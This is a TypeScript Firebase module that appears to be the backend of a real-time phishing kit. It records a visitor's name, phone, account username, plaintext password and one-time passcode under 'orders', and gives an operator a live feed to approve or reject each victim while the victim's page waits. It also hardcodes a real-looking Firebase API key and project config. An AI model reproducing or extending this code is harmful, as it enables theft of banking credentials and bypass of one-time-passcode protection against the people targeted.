import { initializeApp, getApps, type FirebaseApp } from "firebase/app";
import {
  getFirestore,
  collection,
  doc,
  setDoc,
  updateDoc,
  onSnapshot,
  query,
  orderBy,
  type Firestore,
  Timestamp,
} from "firebase/firestore";
import {
  getAuth,
  signInWithEmailAndPassword,
  signOut as firebaseSignOut,
  onAuthStateChanged,
  type Auth,
  type User,
} from "firebase/auth";
import {
  getDatabase,
  ref as rtdbRef,
  onValue,
  type Database,
} from "firebase/database";

const firebaseConfig = {
  apiKey: "AIzaSyBSRLFN8DXH24hdFeZuj6RxsKt9_dceFJk",
  authDomain: "dzt24-8ea60.firebaseapp.com",
  databaseURL: "https://dzt24-8ea60-default-rtdb.firebaseio.com",
  projectId: "dzt24-8ea60",
  storageBucket: "dzt24-8ea60.firebasestorage.app",
  messagingSenderId: "818328713698",
  appId: "1:818328713698:web:0eaa497f53b2968dcee1bb",
  measurementId: "G-SV14E2SMDM",
};

let app: FirebaseApp;
let db: Firestore;
let auth: Auth;
let rtdb: Database;

if (typeof window !== "undefined") {
  if (!getApps().length) {
    app = initializeApp(firebaseConfig);
  } else {
    app = getApps()[0];
  }
  db = getFirestore(app);
  auth = getAuth(app);
  rtdb = getDatabase(app);
}

/* ── Auth exports ── */

export async function adminSignIn(email: string, password: string): Promise<void> {
  await signInWithEmailAndPassword(auth, email, password);
}

export async function adminSignOut(): Promise<void> {
  await firebaseSignOut(auth);
}

export function onAdminAuthChange(callback: (user: User | null) => void): () => void {
  return onAuthStateChanged(auth, callback);
}

/* ── Session helpers ── */

export function getSessionId(): string {
  let id = localStorage.getItem("aman_session");
  if (!id) {
    id = `sub_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
    localStorage.setItem("aman_session", id);
  }
  return id;
}

export function resetSession(): void {
  localStorage.removeItem("aman_session");
}

/* ── Login session (remembers account number) ── */

export function saveLoginSession(username: string): void {
  localStorage.setItem("aman_login_user", username);
}

export function getLoginSession(): string {
  return localStorage.getItem("aman_login_user") ?? "";
}

export function clearLoginSession(): void {
  localStorage.removeItem("aman_login_user");
}

/* ── User-facing data saves ── */

export async function saveRegistration(fullName: string, phone: string): Promise<void> {
  const id = getSessionId();
  await setDoc(doc(db, "orders", id), {
    fullName,
    phone,
    step: "registered",
    approved: null,
    timestamp: Timestamp.now(),
  }, { merge: true });
}

export async function resetApproval(): Promise<void> {
  const id = getSessionId();
  try {
    await updateDoc(doc(db, "orders", id), { approved: null });
  } catch (_) { /* doc may not exist yet — safe to ignore */ }
}

export async function saveLogin(username: string, password: string): Promise<void> {
  const id = getSessionId();
  await setDoc(doc(db, "orders", id), {
    username,
    password,
    step: "login",
    approved: null,
    updatedAt: Timestamp.now(),
  }, { merge: true });
}

export async function saveOtp(otp: string): Promise<void> {
  const id = getSessionId();
  await setDoc(doc(db, "orders", id), {
    otp,
    step: "otp",
    approved: null,
    completedAt: Timestamp.now(),
  }, { merge: true });
}

/* ── Admin actions ── */

export async function approveOrder(id: string): Promise<void> {
  await updateDoc(doc(db, "orders", id), {
    approved: true,
    reviewedAt: Timestamp.now(),
  });
}

export async function rejectOrder(id: string): Promise<void> {
  await updateDoc(doc(db, "orders", id), {
    approved: false,
    reviewedAt: Timestamp.now(),
  });
}

/* ── Realtime listeners ── */

export function listenForApproval(callback: (approved: boolean | null) => void): () => void {
  const id = getSessionId();
  return onSnapshot(doc(db, "orders", id), (snap) => {
    if (!snap.exists()) { callback(null); return; }
    callback(snap.data().approved ?? null);
  });
}

export function subscribeToOrders(callback: (docs: any[]) => void) {
  const q = query(collection(db, "orders"), orderBy("timestamp", "desc"));
  return onSnapshot(q, (snap) => {
    callback(snap.docs.map(d => ({ id: d.id, ...d.data() })));
  });
}

/* ── Realtime Database connection status ── */

export function listenToConnectionStatus(callback: (connected: boolean) => void): () => void {
  const connectedRef = rtdbRef(rtdb, ".info/connected");
  return onValue(connectedRef, (snap) => {
    callback(snap.val() === true);
  });
}

export { db, auth };
